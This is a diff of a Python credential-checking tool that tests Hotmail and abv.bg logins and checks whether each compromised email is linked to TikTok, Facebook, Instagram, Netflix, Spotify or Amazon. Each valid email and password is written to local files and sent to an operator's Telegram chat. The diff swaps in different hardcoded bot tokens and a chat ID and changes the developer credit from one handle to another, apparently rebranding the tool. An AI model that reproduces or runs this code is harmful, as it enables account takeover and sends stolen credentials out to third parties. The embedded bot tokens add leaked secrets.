@@ -15,11 +15,11 @@ from colorama import Fore
 
 # login = 261
 #email = 33
-token = "6564702970:AAEQfDry_5hqRHIqFDXW9wnCESXUKt5AiBU"
-ID = int("5745691671")
+token = "7058880196:AAG3oP7a4nHGfdqnmaUCChMHAv66TPg271k"
+ID = "7079472831"
 
 bot = telebot.TeleBot(token)
-bott = telebot.TeleBot("7071171119:AAE_OX3FWJ8neHY7EH9Cq54piVtID5QXU4U")
+bott = telebot.TeleBot("7058880196:AAG3oP7a4nHGfdqnmaUCChMHAv66TPg271k")
 
 def save(name, type, acc):
 	with open(f"{name}_{type}.txt", "a", encoding="utf-8", errors="ignore") as f:
@@ -427,7 +427,7 @@ enter 1- hotmail
 	     					amzon = em_amazon(email)
 	     					spotify = em_spotify(email)
 	     					netflix = em_ntflix
-	     					mes = f"""{account} | type = {dom} | linked : {ttok}{t1ok}{t2ok}{t3ok}{t4ok}{t5ok}{t6ok} | by : @pppiqi"""
+	     					mes = f"""{account} | type = {dom} | linked : {ttok}{t1ok}{t2ok}{t3ok}{t4ok}{t5ok}{t6ok} | by : @usaByte"""
 	     					if tik == "✅":
 	     						save("tik", "2fa-hotm", account)
 	     						save("all", "2fa-hotm", mes)
@@ -486,7 +486,7 @@ enter 1- hotmail
 	     						t6ok = "}"
 	     						pass
 	     					
-	     					bott.send_message(chat_id=ID, text=f"""{account} | type = {dom} | linked : {ttok}{t1ok}{t2ok}{t3ok}{t4ok}{t5ok}{t6ok} | by : @pppiqi""")
+	     					bott.send_message(chat_id=ID, text=f"""{account} | type = {dom} | linked : {ttok}{t1ok}{t2ok}{t3ok}{t4ok}{t5ok}{t6ok} | by : @usaByte""")
 	     					print(f"{Fore.YELLOW}{account}")
 	     					
 	     				if dom == "hit1" or dom == "hit2":
@@ -497,7 +497,7 @@ enter 1- hotmail
 	     					amzon = em_amazon(email)
 	     					spotify = em_spotify(email)
 	     					netflix = em_ntflix
-	     					mes = f"""{account} | type = {dom} | linked : {ttok}{t1ok}{t2ok}{t3ok}{t4ok}{t5ok}{t6ok} | by : @pppiqi"""
+	     					mes = f"""{account} | type = {dom} | linked : {ttok}{t1ok}{t2ok}{t3ok}{t4ok}{t5ok}{t6ok} | by : @usaByte"""
 	     					if tik == "✅":
 	     						save("tik", "hit-hotm", account)
 	     						save("all", "hit-hotm", mes)
@@ -554,7 +554,7 @@ enter 1- hotmail
 	     						t6ok = "}"
 	     						pass
 	     					
-	     					bott.send_message(chat_id=ID, text=f"""{account} | type = {dom} | linked : {ttok}{t1ok}{t2ok}{t3ok}{t4ok}{t5ok}{t6ok} | by : @pppiqi""")
+	     					bott.send_message(chat_id=ID, text=f"""{account} | type = {dom} | linked : {ttok}{t1ok}{t2ok}{t3ok}{t4ok}{t5ok}{t6ok} | by : @usaByte""")
 	     					print(f"{Fore.GREEN}{account}")
 	     				else:
 	     					
@@ -565,7 +565,7 @@ enter 1- hotmail
 	     					amzon = em_amazon(email)
 	     					spotify = em_spotify(email)
 	     					netflix = em_ntflix
-	     					mes = f"""{account} | type = {dom} | linked : {ttok}{t1ok}{t2ok}{t3ok}{t4ok}{t5ok}{t6ok} | by : @pppiqi"""
+	     					mes = f"""{account} | type = {dom} | linked : {ttok}{t1ok}{t2ok}{t3ok}{t4ok}{t5ok}{t6ok} | by : @usaByte"""
 	     					
 	     					if tik == "✅":
 	     						save("tik", "else-hotm", account)
@@ -623,7 +623,7 @@ enter 1- hotmail
 	     						t6ok = "}"
 	     						pass
 	     					
-	     					bott.send_message(chat_id=ID, text=f"""{account} | type = {dom} | linked : {ttok}{t1ok}{t2ok}{t3ok}{t4ok}{t5ok}{t6ok} | by : @pppiqi""")
+	     					bott.send_message(chat_id=ID, text=f"""{account} | type = {dom} | linked : {ttok}{t1ok}{t2ok}{t3ok}{t4ok}{t5ok}{t6ok} | by : @usaByte""")
 	     					print(f"{Fore.YELLOW}{account}")
 	     					
 	if s == int("2"):
@@ -644,7 +644,7 @@ enter 1- hotmail
 	     					amzon = em_amazon(email)
 	     					spotify = em_spotify(email)
 	     					netflix = em_ntflix
-	     					mes = f"""{account} | type = {dom} | linked : {ttok}{t1ok}{t2ok}{t3ok}{t4ok}{t5ok}{t6ok} | by : @pppiqi"""
+	     					mes = f"""{account} | type = {dom} | linked : {ttok}{t1ok}{t2ok}{t3ok}{t4ok}{t5ok}{t6ok} | by : @usaByte"""
 	     					if tik == "✅":
 	     						save("tik", "hit-abv", account)
 	     						save("all", "hit-abv", mes)
@@ -701,7 +701,7 @@ enter 1- hotmail
 	     						t6ok = "}"
 	     						pass
 	     					
-	     					bott.send_message(chat_id=ID, text=f"""{account} | type = {dom} | linked : {ttok}{t1ok}{t2ok}{t3ok}{t4ok}{t5ok}{t6ok} | by : @pppiqi""")
+	     					bott.send_message(chat_id=ID, text=f"""{account} | type = {dom} | linked : {ttok}{t1ok}{t2ok}{t3ok}{t4ok}{t5ok}{t6ok} | by : @usaByte""")
 	     					print(f"{Fore.GREEN}{account}")
 	     				
 	     				
@@ -776,30 +776,27 @@ enter 1- hotmail
 	     						with open("netflix-2fa.txt", "a", encoding="utf-8", errors="ignore") as f:
 	     						    f.write(f"{account}\n")
 	     						    f.close()
-	     					print(f"""new hotmail hit ❤️‍🔥😆
------------------------------------------------
+	     					print(f"""New Hit !!
+
 email : {email}
 pasword : {psw}
------------------------------------------------
 tik : {c1}
 face : {c3}
 insta : {c4}
 netfiex : {c6}
 spotify : {c5}
 amazon : {c2}
------------------------------------------------
 if True == linked
 if maybe == linked - not linked
 if False == not linked
------------------------------------------------
-Dev : @pppiqi
+Dev : @usaByte
 hits = {hit_True}""")
 	     					with open("2fa-all.txt", "a", encoding="utf-8", errors="ignore") as f:
 	     						
-	     						f.write(f"""{account} | type =={dom} | tik ={c1} | insta ={c4} | facebook ={c3} | Netflix ={c6} | amazon ={c2} | spotify ={c5} | by : @pppiqi\n""")
+	     						f.write(f"""{account} | type =={dom} | tik ={c1} | insta ={c4} | facebook ={c3} | Netflix ={c6} | amazon ={c2} | spotify ={c5} | by : @usaByte\n""")
 	     						f.close()
 	     					
-	     					bot.send_message(chat_id=ID, text=f"""{account} | type =={dom} | tik ={c1} | insta ={c4} | facebook ={c3} | Netflix ={c6} | amazon ={c2} | spotify ={c5} | by : @pppiqi""")
+	     					bot.send_message(chat_id=ID, text=f"""{account} | type =={dom} | tik ={c1} | insta ={c4} | facebook ={c3} | Netflix ={c6} | amazon ={c2} | spotify ={c5} | by : @usaByte""")
 	     				elif dom == "hit1" or dom == "hit2":
 	     					
 	     					hit_True += 1
@@ -837,29 +834,26 @@ hits = {hit_True}""")
 	     						    f.write(f"{account}\n")
 	     						    f.close()
 	     						    
-	     					print(f"""new hotmail hit ❤️‍🔥😆
------------------------------------------------
+	     					print(f"""New Hit !!
+
 email : {email}
 pasword : {psw}
------------------------------------------------
 tik : {c1}
 face : {c3}
 insta : {c4}
 netfiex : {c6}
 spotify : {c5}
 amazon : {c2}
------------------------------------------------
 if True == linked
 if maybe == linked - not linked
 if False == not linked
------------------------------------------------
-Dev : @pppiqi
+Dev : @usaByte
 hits = {hit_True}""")
 	     					with open("hit-all.txt", "a", encoding="utf-8", errors="ignore") as f:
 	     						
-	     						f.write(f"""{account} | type =={dom} | tik ={c1} | insta ={c4} | facebook ={c3} | Netflix ={c6} | amazon ={c2} | spotify ={c5} | by : @pppiqi\n""")
+	     						f.write(f"""{account} | type =={dom} | tik ={c1} | insta ={c4} | facebook ={c3} | Netflix ={c6} | amazon ={c2} | spotify ={c5} | by : @usaByte\n""")
 	     						f.close()
-	     					bot.send_message(chat_id=ID, text=f"""{account} | type =={dom} | tik ={c1} | insta ={c4} | facebook ={c3} | Netflix ={c6} | amazon ={c2} | spotify ={c5} | by : @pppiqi""")
+	     					bot.send_message(chat_id=ID, text=f"""{account} | type =={dom} | tik ={c1} | insta ={c4} | facebook ={c3} | Netflix ={c6} | amazon ={c2} | spotify ={c5} | by : @usaByte""")
 
 	     				else:
 	     					
@@ -898,29 +892,26 @@ hits = {hit_True}""")
 	     						    f.write(f"{account} | {dom}\n")
 	     						    f.close()
 	     						  
-	     					print(f"""new hotmail hit ❤️‍🔥😆
------------------------------------------------
+	     					print(f"""New Hit !!
+
 email : {email}
 pasword : {psw}
------------------------------------------------
 tik : {c1}
 face : {c3}
 insta : {c4}
 netfiex : {c6}
 spotify : {c5}
 amazon : {c2}
------------------------------------------------
 if True == linked
 if maybe == linked - not linked
 if False == not linked
------------------------------------------------
-Dev : @pppiqi
+Dev : @usaByte
 hits = {hit_True}
 hit False = {hit_false}
 all = {all}""")
 	     					with open("else_all.txt", "a", encoding="utf-8", errors="ignore") as f:
 	     						
-	     						f.write(f"""{account} | type =={dom} | tik ={c1} | insta ={c4} | facebook ={c3} | Netflix ={c6} | amazon ={c2} | spotify ={c5} | by : @pppiqi\n""")
+	     						f.write(f"""{account} | type =={dom} | tik ={c1} | insta ={c4} | facebook ={c3} | Netflix ={c6} | amazon ={c2} | spotify ={c5} | by : @usaByte\n""")
 	     						f.close()
 	     					bot.send_message(chat_id=ID, text=f"""{account} | type =={dom} | tik ={c1} | insta ={c4} | facebook ={c3} | Netflix ={c6} | amazon ={c2} | spotify ={c5} | by : @pppiqi""")
 	     		
@@ -944,41 +935,35 @@ all = {all}""")
 	     					c4 = em_insta(email)
 	     					c5 = em_spotify(email)
 	     					c6 = em_ntflix(email)
-	     					print(f"""new abv.bg hit ❤️‍🔥😆
------------------------------------------------
+	     					print(f"""New Hit !!
+
 email : {email}
 pasword : {psw}
------------------------------------------------
 tik : {c1}
 face : {c3}
 insta : {c4}
 netfiex : {c6}
 spotify : {c5}
 amazon : {c2}
------------------------------------------------
 if True == linked
 if maybe == linked - not linked
 if False == not linked
------------------------------------------------
-Dev : @pppiqi
+Dev : @usaByte
 """)
-	     					bot.send_message(chat_id=ID, text=f"""new abv.bg hit ❤️‍🔥😆
------------------------------------------------
+	     					bot.send_message(chat_id=ID, text=f"""New Hit !!
+
 email : {email}
 pasword : {psw}
------------------------------------------------
 tik : {c1}
 face : {c3}
 insta : {c4}
 netfiex : {c6}
 spotify : {c5}
 amazon : {c2}
------------------------------------------------
 if True == linked
 if maybe == linked - not linked
 if False == not linked
------------------------------------------------
-Dev : @pppiqi
+Dev : @usaByte
 """)
 	     					bot.send_message(chat_id=ID, text=f"""{account} | tik ={c1} | insta ={c4} | facebook ={c3} | Netflix ={c6} | amazon ={c2} | spotify ={c5} | by : @pppiqi""")
 
